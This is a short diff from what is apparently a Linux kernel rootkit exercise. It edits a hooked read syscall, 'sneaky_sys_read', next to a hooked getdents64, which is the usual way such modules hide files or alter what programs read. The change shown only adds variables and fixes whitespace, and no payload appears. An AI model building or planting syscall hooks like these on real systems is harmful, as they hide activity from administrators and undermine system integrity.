@@ -100,10 +100,12 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
 }
 
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
-  char *buf = regs->si;
+  unsigned int fd = regs->di;
+  char * buf = regs->si;
+  size_t count = regs->dx;
   ssize_t nread = original_read(regs);
 
-   if(nread == -1){
+  if(nread == -1){
     printk(KERN_INFO "Error in calling original gendents64\n");
   }
   else if (nread == 0){
